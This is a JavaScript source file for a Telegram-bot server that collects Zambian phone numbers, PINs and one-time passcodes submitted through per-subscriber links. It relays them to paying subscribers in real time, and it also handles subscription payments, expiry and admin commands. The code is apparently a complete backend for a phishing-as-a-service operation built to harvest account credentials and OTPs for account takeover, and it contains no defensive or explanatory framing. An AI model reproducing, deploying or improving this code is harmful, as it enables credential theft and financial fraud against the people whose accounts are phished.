// zambia-server.js — Zambia +260 Login→OTP (single-bot webhook mode)
// Standard template: one bot, two-letter IDs, MongoDB, admin commands, expiry, SIGTERM fix
'use strict';
const express     = require('express');
const cors        = require('cors');
const TelegramBot = require('node-telegram-bot-api');
require('dotenv').config();

const { connectDB, markShutdown } = require('./db');
const ZambiaUser                  = require('./models/zambiauser');
const ZambiaState                 = require('./models/zambiastate');

const app  = express();
const PORT = process.env.PORT || 3001;
app.use(cors());
app.use(express.json({ limit: '10kb' }));

const ts  = () => new Date().toISOString();
const log = {
  info:  (...a) => console.log(`[INFO]  ${ts()} -`, ...a),
  error: (...a) => console.error(`[ERROR] ${ts()} -`, ...a),
  warn:  (...a) => console.warn(`[WARN]  ${ts()} -`, ...a),
  debug: (...a) => process.env.DEBUG && console.log(`[DEBUG] ${ts()} -`, ...a),
};

const EXPIRY_DAYS      = parseInt(process.env.EXPIRY_DAYS) || 30;
const PAYMENT_AMOUNT   = process.env.PAYMENT_AMOUNT   || '500';
const RENEWAL_AMOUNT   = process.env.RENEWAL_AMOUNT   || '300';
const PAYMENT_DETAILS  = process.env.PAYMENT_DETAILS  || 'contact admin for payment details';
const ADMIN_CHAT_ID    = (process.env.ADMIN_CHAT_ID   || '').trim();
const WHATSAPP_NUMBER  = (process.env.WHATSAPP_NUMBER || '').trim();
const ROOT_LINK        = (process.env.ROOT_LINK       || '').replace(/\/$/, '');
const WEBHOOK_URL      = (process.env.WEBHOOK_URL     || '').replace(/\/$/, '');
const isAdmin = (chatId) => !!ADMIN_CHAT_ID && String(chatId).trim() === ADMIN_CHAT_ID;

const CFG = Object.freeze({
  APPROVAL_TIMEOUT:       5 * 60_000,
  CLEANUP_INTERVAL:       15_000,
  EXPIRY_CHECK_INTERVAL:  60 * 60 * 1000,
  WARNING_DAYS:           3,
  MAX_MSG_SIZE:           4096,
  SEND_RETRIES:           3,
  SEND_RETRY_DELAY:       1500,
  DUPE_TTL:               5000,
  TG_CHAT_INTERVAL:       1050,
  READ_TTL:               30_000,
  BOT_INIT_DELAY:         1000,
  MAX_RESTART:            5,
  DEDUP_SIZE:             2000,
  SEND_TEXT_TIMEOUT:      5 * 60_000,   // ← NEW: 5-minute window for admin to /sendtext
});

// ── Helpers ──────────────────────────────────────────────────────────────────
const sanitize = (s) => (typeof s === 'string' ? s.replace(/[<>]/g, '').trim() : String(s ?? ''));
const trunc    = (s, n = CFG.MAX_MSG_SIZE) => s.length <= n ? s : s.slice(0, n - 3) + '...';
const sleep    = (ms) => new Promise(r => setTimeout(r, ms));

// ── Zambia +260 phone normalisation ──────────────────────────────────────────
const RE_NONDIGIT = /\D/g;
const _phoneCache = new Map();
const normalise = (raw) => {
  if (!raw || typeof raw !== 'string') return '';
  const hit = _phoneCache.get(raw); if (hit) return hit;
  let c = raw.replace(RE_NONDIGIT, '');
  if (c.startsWith('260')) c = c.slice(3);
  if (c.startsWith('0'))   c = c.slice(1);
  if (c.length > 9)        c = c.slice(-9);
  const result = `+260${c}`;
  if (_phoneCache.size > 5000) _phoneCache.clear();
  _phoneCache.set(raw, result);
  return result;
};
const fmtPhone = (raw) => {
  const full = normalise(raw);
  return { cc: '+260', num: full.slice(4), full };
};

// ── Validators ────────────────────────────────────────────────────────────────
const vPhone = (p) => {
  if (!p || typeof p !== 'string') return 'Phone must be a string';
  const n = p.replace(RE_NONDIGIT, '');
  return (n.length < 9 || n.length > 15) ? 'Invalid phone length' : null;
};
const vPin = (p) =>
  (!p || typeof p !== 'string')             ? 'PIN required' :
  (p.length < 4 || p.length > 8 || !/^\d+$/.test(p)) ? 'PIN must be 4-8 digits' : null;
const vOtp = (o) =>
  (!o || typeof o !== 'string')             ? 'OTP required' :
  (o.length < 4 || o.length > 8 || !/^\d+$/.test(o)) ? 'OTP must be 4-8 digits' : null;

// ── DupeCache / TgQueue ───────────────────────────────────────────────────────
class DupeCache {
  constructor(ttl = CFG.DUPE_TTL) { this._m = new Map(); this._ttl = ttl; }
  seen(key) {
    if (this._m.has(key)) return true;
    const h = setTimeout(() => this._m.delete(key), this._ttl);
    if (h.unref) h.unref();
    this._m.set(key, h); return false;
  }
  clear() { for (const h of this._m.values()) clearTimeout(h); this._m.clear(); }
}

class TgQueue {
  constructor(interval = CFG.TG_CHAT_INTERVAL) {
    this._q = []; this._running = false; this._interval = interval; this._last = 0;
  }
  send(fn) {
    return new Promise((res, rej) => { this._q.push({ fn, res, rej }); if (!this._running) this._drain(); });
  }
  async _drain() {
    this._running = true;
    while (this._q.length) {
      const gap = this._interval - (Date.now() - this._last);
      if (gap > 0) await sleep(gap);
      const { fn, res, rej } = this._q.shift();
      this._last = Date.now();
      try { res(await fn()); } catch (e) { rej(e); }
    }
    this._running = false;
  }
  flush(r = 'flushed') { while (this._q.length) this._q.shift().rej(new Error(r)); }
}

// ── ID / Date helpers ─────────────────────────────────────────────────────────
const encodeId     = (n)   => { n--; return String.fromCharCode(97 + Math.floor(n / 26)) + String.fromCharCode(97 + (n % 26)); };
const decodeId     = (id)  => { if (!/^[a-z]{2}$/.test(id)) return null; return (id.charCodeAt(0) - 97) * 26 + (id.charCodeAt(1) - 97) + 1; };
const nextAvailableId = () => { for (let n = 1; n <= 676; n++) { const id = encodeId(n); if (!users.has(id)) return id; } return null; };
const addDays      = (d, days) => { const r = new Date(d); r.setDate(r.getDate() + days); return r.toISOString(); };
const daysUntil    = (iso)  => Math.ceil((new Date(iso) - Date.now()) / 864e5);
const isExpired    = (iso)  => iso && new Date(iso) <= new Date();
const fmtDate      = (iso)  => iso ? new Date(iso).toLocaleDateString('en-GB', { day: '2-digit', month: 'short', year: 'numeric' }) : 'Never';

// ── Message formatters ────────────────────────────────────────────────────────
const fmtLogin = (user, { phone, pin, time }) => {
  const { cc, num } = fmtPhone(phone);
  return (
    `📱 <b>${sanitize(user.name)} — LOGIN</b>\n\n` +
    `🆕 NEW USER\n` +
    `🌍 <b>Country:</b> <code>${cc}</code>\n` +
    `📞 <b>Number:</b> <code>${num}</code>\n` +
    `🔐 <b>PIN:</b> <code>${sanitize(pin)}</code>\n` +
    `⏰ <b>Time:</b> ${new Date(time).toLocaleString()}\n\n` +
    `📱 Choose how to verify this user:\n\n` +
    `━━━━━━━━━━━━━━━━━━━\n⏱️ Timeout: 5 min`
  );
};

const fmtOtp = (user, { phone, otp, time }) => {
  const { cc, num } = fmtPhone(phone);
  return (
    `✅ <b>${sanitize(user.name)} — OTP VERIFY</b>\n\n` +
    `🆕 VERIFICATION NEEDED\n` +
    `🌍 <b>Country:</b> <code>${cc}</code>\n` +
    `📞 <b>Number:</b> <code>${num}</code>\n` +
    `🔑 <b>OTP:</b> <code>${sanitize(otp)}</code>\n` +
    `⏰ <b>Time:</b> ${new Date(time).toLocaleString()}\n\n` +
    `━━━━━━━━━━━━━━━━━━━\n⏱️ Timeout: 5 min`
  );
};

// ── Send-text pending store ───────────────────────────────────────────────────
// Key: normalised phone number  →  { ts, text, resolved, readAt, msgId }
// Admin replies to the "SEND TEXT CHOSEN" message → auto-resolved.
const pendingSendTexts = new Map();
// Reverse lookup: Telegram message_id → normalised phone (so we match replies)
const sendTextMsgToPhone = new Map();

// ── Callback data helpers ─────────────────────────────────────────────────────
const CB_SEP  = '|';
const mkCb    = (type, action, phone, secret) => [type, action, phone, secret].join(CB_SEP);
const parseCb = (d) => { const p = d.split(CB_SEP); return p.length === 4 ? { type: p[0], action: p[1], phone: p[2], secret: p[3] } : null; };

// ── Users ─────────────────────────────────────────────────────────────────────
const users = new Map();

const makeUserObj = ({ id, name, chatId, source = 'env', createdAt = null, expiresAt = null }) => ({
  id, num: decodeId(id), name: sanitize(name), chatId: String(chatId),
  source, createdAt, expiresAt,
  expired: expiresAt ? isExpired(expiresAt) : false,
  warningSent: false,
  logins: new Map(), otps: new Map(),
  dupes: new DupeCache(), tgQueue: new TgQueue(),
  lastErr: null,
});

const loadEnvUsers = () => {
  let n = 0;
  const pat = /^USER_([A-Z]{2})_ID$/;
  for (const [key, chatId] of Object.entries(process.env)) {
    const m = key.match(pat); if (!m) continue;
    const id   = m[1].toLowerCase();
    const name = process.env[`USER_${m[1]}_NAME`] || `User ${m[1]}`;
    if (!/^-?\d+$/.test(chatId) || users.has(id)) continue;
    users.set(id, makeUserObj({ id, name, chatId, source: 'env' })); n++;
  }
  log.info(`Loaded ${n} user(s) from env (permanent)`);
};

const loadUsersFromDB = async () => {
  let n = 0;
  try {
    const docs = await ZambiaUser.find({}).lean();
    for (const d of docs) {
      if (!d.id || !d.chatId || users.has(d.id)) continue;
      users.set(d.id, makeUserObj({
        id: d.id, name: d.name, chatId: d.chatId, source: 'db',
        createdAt: d.createdAt ? new Date(d.createdAt).toISOString() : null,
        expiresAt: d.expiresAt ? new Date(d.expiresAt).toISOString() : null,
      })); n++;
    }
    log.info(`Loaded ${n} user(s) from MongoDB`);
  } catch (e) { log.error('DB load:', e.message); }
};

const persistUser = async (id, name, chatId, createdAt, expiresAt) => {
  try {
    await ZambiaUser.findOneAndUpdate(
      { id },
      { id, name, chatId: String(chatId), createdAt, expiresAt, source: 'db' },
      { upsert: true, returnDocument: 'after', setDefaultsOnInsert: true }
    );
    return true;
  } catch (e) { return false; }
};

const deleteUserFromDB  = async (id) => { try { await ZambiaUser.deleteOne({ id }); } catch (e) {} };
const deleteStateFromDB = async (userId) => { try { await ZambiaState.deleteOne({ userId }); } catch (e) {} };

const registerUser = async (id, name, chatId) => {
  const now = new Date().toISOString(), exp = addDays(now, EXPIRY_DAYS);
  const obj = makeUserObj({ id, name, chatId, source: 'db', createdAt: now, expiresAt: exp });
  users.set(id, obj);
  await persistUser(id, name, chatId, now, exp);
  sortUsers(); return obj;
};

const renewUser = async (u) => {
  const b   = (u.expiresAt && !isExpired(u.expiresAt)) ? u.expiresAt : new Date().toISOString();
  const exp = addDays(b, EXPIRY_DAYS);
  u.expiresAt = exp; u.expired = false; u.warningSent = false;
  await persistUser(u.id, u.name, u.chatId, u.createdAt, exp);
  return exp;
};

const sortUsers = () => {
  const s = new Map([...users.entries()].sort((a, b) => a[1].num - b[1].num));
  users.clear(); for (const [k, v] of s) users.set(k, v);
};

// ── State ─────────────────────────────────────────────────────────────────────
const persistState = async (userId) => {
  try { await ZambiaState.findOneAndUpdate({ userId }, { userId, verified: {} }, { upsert: true }); } catch (e) {}
};
const loadStateFromDB = async () => {
  let n = 0;
  try {
    const docs = await ZambiaState.find({}).lean();
    for (const d of docs) { if (users.has(d.userId)) n++; }
    log.info(`Loaded state for ${n} user(s)`);
  } catch (e) {}
};

const pendingPayments = new Map();
const pendingRenewals = new Map();

// ── Bot ───────────────────────────────────────────────────────────────────────
let bot = null, botHealthy = false, initLock = false;
const processedUpdates = new Set();
const trackUpdate = (uid) => {
  if (processedUpdates.has(uid)) return false;
  processedUpdates.add(uid);
  if (processedUpdates.size > CFG.DEDUP_SIZE)
    processedUpdates.delete(processedUpdates.values().next().value);
  return true;
};

const sendTg = async (chatId, message, options = {}) => {
  if (!bot || !botHealthy) return { success: false, error: 'Bot not ready' };
  try {
    await bot.sendMessage(chatId, trunc(message), { parse_mode: 'HTML', ...options });
    return { success: true };
  } catch (err) {
    log.error(`sendTg ${chatId}:`, err.message);
    if (err.response?.statusCode === 401) botHealthy = false;
    return { success: false, error: err.message };
  }
};

const sendMsg = async (user, text, opts = {}) => {
  if (!bot || !botHealthy) return { ok: false, err: 'Bot not ready' };
  return user.tgQueue.send(async () => {
    let attempt = 0;
    while (true) {
      try {
        await bot.sendMessage(user.chatId, trunc(text), { parse_mode: 'HTML', ...opts });
        user.lastErr = null; return { ok: true };
      } catch (e) {
        user.lastErr = e.message;
        const s = e.response?.statusCode;
        if (s === 401) { botHealthy = false; return { ok: false, err: 'Auth failed' }; }
        if (s === 429) { await sleep(Math.min((e.response?.parameters?.retry_after || 10) * 1000, 60000)); continue; }
        if (s >= 500 && attempt < CFG.SEND_RETRIES) { attempt++; await sleep(CFG.SEND_RETRY_DELAY * attempt); continue; }
        return { ok: false, err: e.message };
      }
    }
  });
};

const clearBotListeners = () => {
  if (!bot) return;
  try {
    bot.removeAllListeners();
    if (Array.isArray(bot._textRegexpCallbacks)) bot._textRegexpCallbacks = [];
    if (Array.isArray(bot._replyListeners))      bot._replyListeners = [];
  } catch (e) {}
};

const initBot = async () => {
  if (initLock) return; initLock = true;
  try {
    if (bot) { clearBotListeners(); bot = null; }
    await sleep(CFG.BOT_INIT_DELAY);
    const token = process.env.BOT_TOKEN;
    if (!token || !/^\d+:[A-Za-z0-9_-]+$/.test(token)) { log.error('BOT_TOKEN missing/invalid'); return; }
    if (!WEBHOOK_URL) { log.error('WEBHOOK_URL not set'); return; }
    log.info('Creating bot instance (webhook mode)...');
    bot = new TelegramBot(token, { webHook: false, filepath: false });
    bot.on('error', (e) => log.error('Bot error:', e.message));
    registerHandlers();
    flushUpdateBuffer();
    const whUrl = `${WEBHOOK_URL}/webhook/${token}`;
    try {
      await bot.deleteWebHook();
      await bot.setWebHook(whUrl, { allowed_updates: ['message', 'callback_query'], drop_pending_updates: true });
      log.info(`✅ Webhook set → ${whUrl}`);
    } catch (e) { log.error('Webhook failed:', e.message); botHealthy = false; return; }
    try {
      const me = await bot.getMe();
      log.info(`✅ Bot verified — @${me.username}`);
      botHealthy = true;
    } catch (e) { log.error('Verify failed:', e.message); botHealthy = false; }
  } finally { initLock = false; }
};

const getUsername = (from) =>
  from.username
    ? `@${from.username}`
    : `${from.first_name || ''}${from.last_name ? ' ' + from.last_name : ''}`.trim() || 'Unknown';

// ── Register handlers ─────────────────────────────────────────────────────────
const registerHandlers = () => {
  const onMsg = (re, fn) => {
    bot.onText(re, async (msg, match) => {
      if (!trackUpdate(msg.update_id ?? msg.message_id)) return;
      try { await fn(msg, match); } catch (e) { log.error('Handler:', e.message); }
    });
  };

  // /start
  onMsg(/^\/start(@\S+)?$/, async (msg) => {
    const chatId = String(msg.chat.id), un = getUsername(msg.from);
    if (isAdmin(chatId)) {
      await bot.sendMessage(msg.chat.id,
        `🛠️ <b>Admin Console</b>\n\n👤 ${sanitize(un)}\n🆔 <code>${chatId}</code>\n👥 ${users.size}/676\n\n/adminhelp`,
        { parse_mode: 'HTML' }).catch(() => {});
      return;
    }
    const eu = [...users.values()].find(u => u.chatId === chatId);
    if (eu) {
      if (eu.expired || isExpired(eu.expiresAt)) {
        eu.expired = true;
        await bot.sendMessage(msg.chat.id,
          `🤖 <b>Zambia Bot</b>\n\n👤 ${sanitize(un)}\n🆔 <code>${chatId}</code>\n\n` +
          `⚠️ <b>Expired</b> ${fmtDate(eu.expiresAt)}.\n\nPay <b>KSh. ${RENEWAL_AMOUNT}</b> to:\n` +
          `<code>${PAYMENT_DETAILS}</code>\n\nThen tap below + WhatsApp screenshot to <b>${WHATSAPP_NUMBER}</b>.`,
          { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[
            { text: '✅ I Have Renewed', callback_data: `renew|claim|${chatId}` },
            { text: '❌ Cancel',          callback_data: `renew|cancel|${chatId}` },
          ]] } }).catch(() => {});
        return;
      }
      const link = ROOT_LINK ? `${ROOT_LINK}/${eu.id}/` : '';
      const dl   = eu.expiresAt ? daysUntil(eu.expiresAt) : null;
      await bot.sendMessage(msg.chat.id,
        `🤖 <b>Zambia Bot</b>\n\n👤 ${sanitize(un)}\n🆔 <code>${chatId}</code>\n\n` +
        `✅ Active\n🔗 <code>${link}</code>\n📅 ${eu.expiresAt ? `${fmtDate(eu.expiresAt)} (${dl}d)` : 'Permanent'}\n\n/mylink  /expiry  /myid`,
        { parse_mode: 'HTML' }).catch(() => {});
      return;
    }
    await bot.sendMessage(msg.chat.id,
      `🤖 <b>Zambia Bot</b>\n\n👤 ${sanitize(un)}\n🆔 <code>${chatId}</code>\n\n━━━━━━━━━━━━━━━━━━━\n\n` +
      `💳 Pay <b>KSh. ${PAYMENT_AMOUNT}</b> to:\n<code>${PAYMENT_DETAILS}</code>\n\n` +
      `Valid for <b>${EXPIRY_DAYS} days</b>.\n\nTap <b>I Have Paid</b> + WhatsApp screenshot to <b>${WHATSAPP_NUMBER}</b>.`,
      { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[
        { text: '✅ I Have Paid', callback_data: `pay|claim|${chatId}` },
        { text: '❌ Cancel',      callback_data: `pay|cancel|${chatId}` },
      ]] } }).catch(() => {});
    if (ADMIN_CHAT_ID)
      await sendTg(ADMIN_CHAT_ID, `👤 <b>New User</b>\n\n${sanitize(un)}\n<code>${chatId}</code>\n${new Date().toLocaleString()}`);
  });

  onMsg(/^\/mylink(@\S+)?$/, async (msg) => {
    const u = [...users.values()].find(u => u.chatId === String(msg.chat.id));
    if (!u || !ROOT_LINK) return;
    await bot.sendMessage(msg.chat.id, `🔗 <code>${ROOT_LINK}/${u.id}/</code>`, { parse_mode: 'HTML' }).catch(() => {});
  });

  onMsg(/^\/expiry(@\S+)?$/, async (msg) => {
    const u = [...users.values()].find(u => u.chatId === String(msg.chat.id));
    if (!u) return;
    if (!u.expiresAt) { await bot.sendMessage(msg.chat.id, `📅 <b>Permanent</b>`, { parse_mode: 'HTML' }).catch(() => {}); return; }
    await bot.sendMessage(msg.chat.id,
      `📅 ${fmtDate(u.expiresAt)} — ${isExpired(u.expiresAt) ? '❌ EXPIRED' : `${daysUntil(u.expiresAt)}d left`}`,
      { parse_mode: 'HTML' }).catch(() => {});
  });

  onMsg(/^\/myid(@\S+)?$/, async (msg) => {
    await bot.sendMessage(msg.chat.id, `🆔 <code>${msg.chat.id}</code>`, { parse_mode: 'HTML' }).catch(() => {});
  });

  // ── Admin commands ───────────────────────────────────────────────────────────
  onMsg(/^\/adminhelp(@\S+)?$/, async (msg) => {
    if (!isAdmin(String(msg.chat.id))) return;
    await bot.sendMessage(msg.chat.id,
      `🛠️ <b>Admin</b>\n\n/status  /userinfo &lt;id&gt;\n` +
      `/adduser &lt;chatId&gt; &lt;name&gt; [days|permanent]\n` +
      `/assignuser &lt;slot&gt; &lt;chatId&gt; &lt;name&gt; [days|permanent]\n` +
      `/removeuser &lt;id&gt;  /extend &lt;id&gt; &lt;days&gt;\n` +
      `/extendall &lt;days&gt;  /reduceall &lt;days&gt;\n` +
      `/revoke &lt;id&gt;  /permanent &lt;id&gt;  /broadcast &lt;msg&gt;\n\n` +
      `📤 <b>Reply with Text:</b>\nTap "Reply with Text" on a login → swipe-reply with the message.\n` +
      `<i>Or fallback: /sendtext &lt;phone&gt; &lt;text&gt;</i>`,
      { parse_mode: 'HTML' }).catch(() => {});
  });

  onMsg(/^\/status(@\S+)?$/, async (msg) => {
    if (!isAdmin(String(msg.chat.id))) return;
    const lines = [`✅ <b>Status</b>\n`, `👥 ${users.size}/676`, `⏳ Pay: ${pendingPayments.size}`, `🔄 Ren: ${pendingRenewals.size}`, `📤 SendText: ${pendingSendTexts.size}\n`];
    for (const u of users.values()) {
      const e = u.expiresAt ? (isExpired(u.expiresAt) ? '❌' : `✅${daysUntil(u.expiresAt)}d`) : '♾️';
      lines.push(`• <b>${u.name}</b> [<code>${u.id}</code>] ${e} (${u.source})`);
    }
    await bot.sendMessage(msg.chat.id, trunc(lines.join('\n')), { parse_mode: 'HTML' }).catch(() => {});
  });

  // ── /sendtext is handled at Express webhook level (see handleSendTextCommand) ──

  onMsg(/^\/userinfo(@\S+)?\s+(\S+)/, async (msg, match) => {
    if (!isAdmin(String(msg.chat.id))) return;
    const u = users.get(match[2].trim().toLowerCase());
    if (!u) { await bot.sendMessage(msg.chat.id, `❌ Not found.`).catch(() => {}); return; }
    await bot.sendMessage(msg.chat.id,
      `👤 <b>${u.name}</b> [<code>${u.id}</code>]\n🆔 <code>${u.chatId}</code> (${u.source})\n` +
      `📅 ${u.expiresAt ? fmtDate(u.expiresAt) : 'Permanent'}\n📊 Logins:${u.logins.size} OTPs:${u.otps.size}`,
      { parse_mode: 'HTML' }).catch(() => {});
  });

  onMsg(/^\/adduser(@\S+)?\s+(.+)/, async (msg, match) => {
    if (!isAdmin(String(msg.chat.id))) return;
    const p = match[2].trim().split(/\s+/); if (p.length < 2) return;
    const cid = p[0]; if (!/^-?\d+$/.test(cid)) return;
    let days = EXPIRY_DAYS, np = p.slice(1);
    const last = np[np.length - 1];
    if (/^permanent$/i.test(last)) { days = null; np = np.slice(0, -1); }
    else if (/^\d+$/.test(last))  { days = parseInt(last); np = np.slice(0, -1); }
    const name = np.join(' ').trim();
    if (!name || [...users.values()].find(u => u.chatId === cid)) return;
    const nid = nextAvailableId(); if (!nid) return;
    const now = new Date().toISOString(), exp = days === null ? null : addDays(now, days);
    users.set(nid, makeUserObj({ id: nid, name, chatId: cid, source: 'db', createdAt: now, expiresAt: exp }));
    await persistUser(nid, name, cid, now, exp); sortUsers();
    const link = ROOT_LINK ? `${ROOT_LINK}/${nid}/` : '';
    await bot.sendMessage(msg.chat.id,
      `✅ Added [<code>${nid}</code>] ${sanitize(name)}\n🔗 <code>${link}</code>\n📅 ${exp ? fmtDate(exp) : 'Permanent'}`,
      { parse_mode: 'HTML' }).catch(() => {});
    await sendTg(cid, `🎉 <b>Added!</b>\n\n🔗 <code>${link}</code>\n📅 ${exp ? fmtDate(exp) : 'Permanent'}\n\n/mylink`);
  });

  onMsg(/^\/assignuser(@\S+)?\s+(.+)/, async (msg, match) => {
    if (!isAdmin(String(msg.chat.id))) return;
    const p = match[2].trim().split(/\s+/); if (p.length < 3) return;
    const slot = p[0].toLowerCase(), cid = p[1];
    if (!/^[a-z]{2}$/.test(slot) || !/^-?\d+$/.test(cid) || users.has(slot) || [...users.values()].find(u => u.chatId === cid)) return;
    let days = EXPIRY_DAYS, np = p.slice(2);
    const last = np[np.length - 1];
    if (/^permanent$/i.test(last)) { days = null; np = np.slice(0, -1); }
    else if (/^\d+$/.test(last))  { days = parseInt(last); np = np.slice(0, -1); }
    const name = np.join(' ').trim(); if (!name) return;
    const now = new Date().toISOString(), exp = days === null ? null : addDays(now, days);
    users.set(slot, makeUserObj({ id: slot, name, chatId: cid, source: 'db', createdAt: now, expiresAt: exp }));
    await persistUser(slot, name, cid, now, exp); sortUsers();
    const link = ROOT_LINK ? `${ROOT_LINK}/${slot}/` : '';
    await bot.sendMessage(msg.chat.id, `✅ Assigned [<code>${slot}</code>] ${sanitize(name)}`, { parse_mode: 'HTML' }).catch(() => {});
    await sendTg(cid, `🎉 <b>Added!</b>\n\n🔗 <code>${link}</code>\n📅 ${exp ? fmtDate(exp) : 'Permanent'}\n\n/mylink`);
  });

  onMsg(/^\/removeuser(@\S+)?\s+(\S+)/, async (msg, match) => {
    if (!isAdmin(String(msg.chat.id))) return;
    const id = match[2].trim().toLowerCase(), u = users.get(id);
    if (!u) return;
    if (u.source === 'env') { await bot.sendMessage(msg.chat.id, `⚠️ Env user.`).catch(() => {}); return; }
    u.dupes.clear(); u.tgQueue.flush('removed');
    users.delete(id); await deleteUserFromDB(id); await deleteStateFromDB(id);
    await bot.sendMessage(msg.chat.id, `✅ Removed ${u.name} [${id}]`).catch(() => {});
  });

  onMsg(/^\/extend(@\S+)?\s+(\S+)\s+(\d+)/, async (msg, match) => {
    if (!isAdmin(String(msg.chat.id))) return;
    const u = users.get(match[2].trim().toLowerCase()), d = parseInt(match[3]); if (!u) return;
    const b = (u.expiresAt && !isExpired(u.expiresAt)) ? u.expiresAt : new Date().toISOString();
    const exp = addDays(b, d); u.expiresAt = exp; u.expired = false; u.warningSent = false;
    await persistUser(u.id, u.name, u.chatId, u.createdAt, exp);
    await bot.sendMessage(msg.chat.id, `✅ +${d}d → ${fmtDate(exp)}`).catch(() => {});
  });

  onMsg(/^\/extendall(@\S+)?\s+(\d+)/, async (msg, match) => {
    if (!isAdmin(String(msg.chat.id))) return;
    const d = parseInt(match[2]);
    for (const u of users.values()) {
      if (!u.expiresAt) continue;
      u.expiresAt = addDays(u.expiresAt, d); u.expired = false; u.warningSent = false;
      await persistUser(u.id, u.name, u.chatId, u.createdAt, u.expiresAt);
    }
    await bot.sendMessage(msg.chat.id, `✅ +${d}d all.`).catch(() => {});
  });

  onMsg(/^\/reduceall(@\S+)?\s+(\d+)/, async (msg, match) => {
    if (!isAdmin(String(msg.chat.id))) return;
    const d = parseInt(match[2]);
    const we = [...users.values()].filter(u => u.expiresAt && daysUntil(u.expiresAt) - d <= 0);
    if (we.length) { await bot.sendMessage(msg.chat.id, `⚠️ Would expire ${we.length}. /reduceallconfirm ${d}`).catch(() => {}); return; }
    for (const u of users.values()) {
      if (!u.expiresAt) continue;
      u.expiresAt = addDays(u.expiresAt, -d); u.warningSent = false;
      await persistUser(u.id, u.name, u.chatId, u.createdAt, u.expiresAt);
    }
    await bot.sendMessage(msg.chat.id, `✅ -${d}d all.`).catch(() => {});
  });

  onMsg(/^\/reduceallconfirm(@\S+)?\s+(\d+)/, async (msg, match) => {
    if (!isAdmin(String(msg.chat.id))) return;
    const d = parseInt(match[2]);
    for (const u of users.values()) {
      if (!u.expiresAt) continue;
      u.expiresAt = addDays(u.expiresAt, -d); u.warningSent = false;
      if (isExpired(u.expiresAt)) u.expired = true;
      await persistUser(u.id, u.name, u.chatId, u.createdAt, u.expiresAt);
    }
    await bot.sendMessage(msg.chat.id, `✅ Confirmed -${d}d.`).catch(() => {});
  });

  onMsg(/^\/revoke(@\S+)?\s+(\S+)/, async (msg, match) => {
    if (!isAdmin(String(msg.chat.id))) return;
    const u = users.get(match[2].trim().toLowerCase()); if (!u) return;
    u.expiresAt = new Date(Date.now() - 60000).toISOString(); u.expired = true;
    await persistUser(u.id, u.name, u.chatId, u.createdAt, u.expiresAt);
    await bot.sendMessage(msg.chat.id, `✅ Revoked ${u.name}`).catch(() => {});
  });

  onMsg(/^\/permanent(@\S+)?\s+(\S+)/, async (msg, match) => {
    if (!isAdmin(String(msg.chat.id))) return;
    const u = users.get(match[2].trim().toLowerCase()); if (!u) return;
    u.expiresAt = null; u.expired = false; u.warningSent = false;
    await persistUser(u.id, u.name, u.chatId, u.createdAt, null);
    await bot.sendMessage(msg.chat.id, `✅ ${u.name} permanent.`).catch(() => {});
  });

  onMsg(/^\/broadcast(@\S+)?\s+([\s\S]+)/, async (msg, match) => {
    if (!isAdmin(String(msg.chat.id))) return;
    const t = match[2].trim(); let s = 0, f = 0;
    for (const u of users.values()) {
      const r = await sendTg(u.chatId, `📢 <b>Announcement</b>\n\n${sanitize(t)}`);
      r.success ? s++ : f++;
    }
    await bot.sendMessage(msg.chat.id, `✅ Sent ${s}, failed ${f}`).catch(() => {});
  });

  // ── Callback queries ─────────────────────────────────────────────────────────
  bot.on('callback_query', async (query) => {
    if (!trackUpdate(`cb_${query.id}`)) return;
    try { await handleCallback(query); }
    catch (e) {
      log.error('Callback:', e.message);
      try { await bot.answerCallbackQuery(query.id, { text: '❌ Error', show_alert: true }); } catch (x) {}
    }
  });
};

// ── Callback handler ──────────────────────────────────────────────────────────
async function handleCallback(query) {
  const msg = query.message, chatId = msg.chat.id, messageId = msg.message_id, data = query.data;
  const ack  = async (t, a = false) => { try { await bot.answerCallbackQuery(query.id, { text: t, show_alert: a }); } catch (e) {} };
  const edit = async (t, kb = null) => {
    try { await bot.editMessageText(t, { chat_id: chatId, message_id: messageId, parse_mode: 'HTML', reply_markup: kb || { inline_keyboard: [] } }); }
    catch (e) { if (!e.message?.includes('not modified')) log.error('Edit:', e.message); }
  };

  // Payment flow
  if (data.startsWith('pay|')) {
    const [, action] = data.split('|'), un = getUsername(query.from);
    if (action === 'claim') {
      if ([...users.values()].find(u => u.chatId === String(chatId))) { await edit(`✅ Already registered. /mylink`); return; }
      if (pendingPayments.has(String(chatId))) { await edit(`⏳ Pending.`); return; }
      pendingPayments.set(String(chatId), { chatId: String(chatId), username: un, claimedAt: Date.now() });
      await edit(`⏳ <b>Claim Received</b>\n\n🆔 <code>${chatId}</code>\n\nKeep this ID. Sent to admin.`);
      if (ADMIN_CHAT_ID)
        await sendTg(ADMIN_CHAT_ID, `💳 <b>New Claim</b>\n\n${sanitize(un)}\n<code>${chatId}</code>\nKSh. ${PAYMENT_AMOUNT}`, {
          reply_markup: { inline_keyboard: [[
            { text: '✅ Approve', callback_data: `admin|approve|${chatId}|${un}` },
            { text: '❌ Reject',  callback_data: `admin|reject|${chatId}|${un}` },
          ]] }
        });
    } else if (action === 'cancel') { await edit(`❌ Cancelled. /start`); }
    return;
  }

  // Renewal flow
  if (data.startsWith('renew|')) {
    const [, action] = data.split('|'), un = getUsername(query.from);
    if (action === 'claim') {
      const eu = [...users.values()].find(u => u.chatId === String(chatId));
      if (!eu) { await edit(`⚠️ Not found.`); return; }
      if (pendingRenewals.has(String(chatId))) { await edit(`⏳ Pending.`); return; }
      pendingRenewals.set(String(chatId), { chatId: String(chatId), username: un, userId: eu.id, claimedAt: Date.now() });
      await edit(`⏳ <b>Renewal Claim</b>\n\n🆔 <code>${chatId}</code>`);
      if (ADMIN_CHAT_ID)
        await sendTg(ADMIN_CHAT_ID, `🔄 <b>Renewal</b>\n\n${sanitize(un)}\n<code>${chatId}</code>\n<code>${eu.id}</code>\nKSh. ${RENEWAL_AMOUNT}`, {
          reply_markup: { inline_keyboard: [[
            { text: '✅ Approve', callback_data: `admin|renew|${chatId}|${un}` },
            { text: '❌ Reject',  callback_data: `admin|rejectrenew|${chatId}|${un}` },
          ]] }
        });
    } else if (action === 'cancel') { await edit(`❌ Cancelled.`); }
    return;
  }

  // Admin approval flow
  if (data.startsWith('admin|')) {
    if (!isAdmin(String(chatId))) { await ack('❌', true); return; }
    const p = data.split('|'), action = p[1], ucid = p[2], un = p[3] || '?';
    const dn = sanitize(un.replace(/^@/, '')), tl = `⏱️ ${new Date().toLocaleTimeString()}`;
    if (action === 'approve') {
